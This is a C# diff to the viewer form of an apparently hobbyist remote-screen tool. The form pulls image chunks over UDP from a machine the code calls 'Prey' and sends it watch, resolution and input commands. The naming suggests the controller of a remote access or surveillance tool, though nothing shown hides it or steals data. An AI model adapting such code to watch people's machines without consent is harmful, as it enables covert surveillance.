@@ -25,13 +25,17 @@ namespace Alice_client
             index_for_Prey = index;
             pictureBox1.SizeMode = PictureBoxSizeMode.AutoSize;
             flowLayoutPanel1.Controls.Add(pictureBox1);
+            label1.Text = Resolution.part.ToString();
         }
         IPEndPoint _PreySRV = null;
 
         private void Start(int index)
         {
+             allbyte = new List<byte[]>();
+            // comboBox1.SelectedItem = 0;
+            ConnectPrey.resolution = comboBox1.GetItemText( comboBox1.Items[0]);
+          // MessageBox.Show( comboBox1.SelectedText);
 
-            
             Command._ConnectPrey(index);
             this.Activate();
             IPEndPoint _aliceSRV = null;
@@ -44,7 +48,7 @@ namespace Alice_client
                 byte[] ping2 = Connection.server1.Whait_recive(ref _aliceSRV);
             }
             
-            for (int i=0;i<100;i++)
+            for (int i=0;i<Resolution.part;i++)
             { 
 
                 Thread.Sleep(10);
@@ -56,11 +60,22 @@ namespace Alice_client
                 }
                 else
                 {
-                    on=Connection.server1.Whait_recive(ref _aliceSRV);
-                    Console.Write(i);
+                    while (true) {
+                        try
+                        {
+                            on = Connection.server1.Whait_recive(ref _aliceSRV);
+                            Console.Write(i);
+                            break;
+                        }
+                        catch
+                        {
+                          
+                            Connection.server1.Send_mess(BaseTool.Convertbtst("NO"), _aliceSRV);
+                        }
+                        
+                    }
                 }
-              
-
+             
                 if (on.Length > 1)
                 {
                     if (on[0].Equals((byte)allbyte.Count))
@@ -72,11 +87,11 @@ namespace Alice_client
                     }
                     else
                     {
-
+                        i = allbyte.Count;
                     }
                 }
-                else
-                    Connection.server1.Send_mess(BaseTool.Convertbtst("NO"), _aliceSRV);
+               //else
+                    //Connection.server1.Send_mess(BaseTool.Convertbtst("NO"), _aliceSRV);
 
 
             }
@@ -97,16 +112,29 @@ namespace Alice_client
             //    }
             //}
 
-            Bitmap _see = BaseTool._Pullimage(BaseTool._GetList(allbyte));
-            see(_see);
+            //Bitmap _see = BaseTool._Pullimage(BaseTool._GetList(allbyte));
+            //see(_see);
             var t = Task.Run(() =>
             {
-                _update_data();
+
+                _update_dataWithoutSync();
+                
+                
             });
 
 
         }
       
+
+
+        public void _UpdateDAta()
+        {
+
+            allbyte = BaseTool.CutInToParts((Bitmap)pictureBox1.Image);
+           
+        }
+
+
 
 
        public static bool  _status = true;
@@ -139,10 +167,11 @@ namespace Alice_client
             // });
         }
 
+       static bool _stop = false;
         private void _update_data()
         {
             bool isStartUpdate = false;
-            while (true)
+            while (!_stop)
             {
                 byte[] next = Connection.server1.Whait_recive();
                 string reciv = BaseTool.Convertbtst(next);
@@ -160,6 +189,7 @@ namespace Alice_client
                 {
                     if (next.Length > 12)//error update_data
                     {
+                        Console.WriteLine(next[0]);
                         allbyte[next[0]] = next;
                     }
                 }
@@ -169,6 +199,52 @@ namespace Alice_client
 
                 }
             }
+            _stop = false;
+        }
+
+
+        private void _update_dataWithoutSync()
+        {
+           
+            while (!_stop)
+            {
+                byte[] next = new byte[0];
+                try
+                {
+                    next = Connection.server1.Whait_recive();
+                }
+                catch
+                {
+                    Console.WriteLine("error 1 Нет приема");
+                }
+                string reciv = BaseTool.Convertbtst(next);
+
+                if (next.Length > 12)//error update_data
+                {
+                    Console.WriteLine(next[0]);
+                    if (allbyte.Count>next[0])
+                    {
+                        allbyte[next[0]] = next;
+                    }
+                    
+                }
+                try
+                {
+                    Bitmap _see = BaseTool._Pullimage(BaseTool._GetList(allbyte));
+                    Invoke(new Action(() => { see(_see); }));
+                }
+                catch
+
+                {
+                    Console.WriteLine("error 213 Bitmap _see = BaseTool._Pullimage(BaseTool._GetList(allbyte))");
+                    allbyte = BaseTool.CutInToParts((Bitmap)pictureBox1.Image);
+                }
+              
+               
+                  
+               
+            }
+            _stop = false;
         }
 
         public void see(Bitmap bmp)
@@ -200,6 +276,7 @@ namespace Alice_client
             {
                 if (whait_send > 3)
                 {
+
                     int _mouse_X = (Cursor.Position.X - this.Location.X)-10;
                     int _mouse_Y = (Cursor.Position.Y - this.Location.Y)-30;
                     Console.WriteLine(_mouse_X + " " + _mouse_Y);
@@ -260,6 +337,48 @@ namespace Alice_client
             //string key = e.KeyCode.ToString();
             //byte[] mousecoord = BaseTool.Convertbtst("[key_press][" + key + "]");
             //Connection.server1.Send_mess(mousecoord, _PreySRV);
+        }
+
+        private void Viewer_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            for(int i=0;i<10;i++)
+            {
+               
+                byte[] command = BaseTool.Convertbtst("[stop_watching]");
+                Connection.server1.Send_mess(command, _PreySRV);
+            }
+            Alice_client._status = true;
+            _stop = true;
+            this.Dispose();
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            ConnectPrey.resolution = comboBox1.GetItemText(comboBox1.SelectedItem);
+           byte[] command = BaseTool.Convertbtst("[change_resolution]["+ ConnectPrey.resolution + "]");
+            Connection.server1.Send_mess(command, _PreySRV);
+        }
+
+           private void trackBar1_MouseUp(object sender, MouseEventArgs e)
+        {
+            trackBar1.Value = ((int)Math.Round(trackBar1.Value / 10.0)) * 10;
+           
+            Resolution.SetPart(trackBar1.Value);
+            byte[] command = BaseTool.Convertbtst("[change_part][" + Resolution.part + "]");
+            Connection.server1.Send_mess(command, _PreySRV);
+            _stop = true;
+            Start(index_for_Prey);
+            label1.Text = Resolution.part.ToString();
+        }
+
+        private void flowLayoutPanel1_Paint(object sender, PaintEventArgs e)
+        {
+
+        }
+
+        private void trackBar2_ValueChanged(object sender, EventArgs e)
+        {
+            label2.Text = (trackBar2.Value* 10.0).ToString();
         }
     }
 }
